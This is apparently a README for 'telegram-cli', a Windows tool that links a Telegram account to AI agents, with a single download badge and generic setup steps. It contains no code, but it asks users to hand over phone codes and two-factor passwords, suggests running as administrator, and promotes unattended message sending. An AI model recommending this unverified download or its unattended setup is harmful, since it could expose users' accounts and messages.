# 🤖 telegram-cli - Efficiently manage telegram messages using AI Tools

[![](https://img.shields.io/badge/Download-TelegramCLI-blue.svg)](https://github.com/Lawntennisnovice323/telegram-cli)

This tool connects your Telegram account to AI agents. It allows automated systems like Claude Code, Cursor, and GitHub Copilot to read and send messages. You gain a way to automate responses or gather information from your chats using structured data formats like JSON.

## 📦 System Requirements

Your computer needs a few components to run this software. Ensure you have the following items ready:

* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM or more.
* Storage: 200MB of free disk space.
* Internet Connection: A stable connection for API communication.
* Telegram Account: You need an active phone number to sign in.

## 🔑 Linking Your Telegram Account

The application acts as a bridge between your account and your AI agents. You must authorize the connection once:

1. Open the Telegram CLI application from your Start Menu.
2. Enter your phone number in the command prompt window exactly as requested.
3. You will receive a code through the official Telegram application on your phone.
4. Type that code into the command prompt when prompted.
5. If you have two-factor authentication enabled, enter your password when asked.
6. The application will save an encrypted session file so you do not need to repeat this step later.

## 🛠 Integrating with AI Agents

This tool creates a bridge for your AI agents. To use it with tools like Cursor, Claude Code, or GitHub Copilot, follow these instructions:

1. Identify the AI agent software you use.
2. Within that software's settings, locate the section for External Tools or Command Line Integration.
3. Enter the path to your Telegram CLI installation folder.
4. Provide the necessary permissions if your AI agent requests access to run scripts.

The software outputs data in JSON format. This allows the AI to parse your message history, send new messages, and manage contacts without human intervention.

## 📈 Managing Data Flows

The tool works by creating structured outputs. When an AI agent scans your messages, it creates a JSON file. This file contains the sender, the message content, the timestamp, and any media metadata. 

If you use Grok or Antigravity, refer to their specific configuration guides to point them to the output folder generated by this tool. The tool updates these files in real-time as new messages arrive.

## 🛠 Troubleshooting Common Issues

If the application fails to start or connect, verify these common fixes:

* Restart your computer to clear any locked processes.
* Check your internet connection status.
* Ensure no other programs use the same port or Telegram session.
* Run the application as an administrator if you encounter permission errors.
* Verify your phone number format matches the international standard (including the plus sign and country code).
